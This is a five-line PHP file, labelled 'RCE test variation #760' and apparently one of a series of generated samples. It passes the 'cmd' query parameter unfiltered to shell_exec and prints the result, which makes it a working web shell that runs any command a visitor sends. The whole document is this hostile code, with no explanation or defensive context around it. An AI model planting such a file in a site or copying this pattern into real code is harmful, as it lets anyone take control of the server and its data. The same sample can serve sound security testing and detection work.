<?php
// RCE test variation #760
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>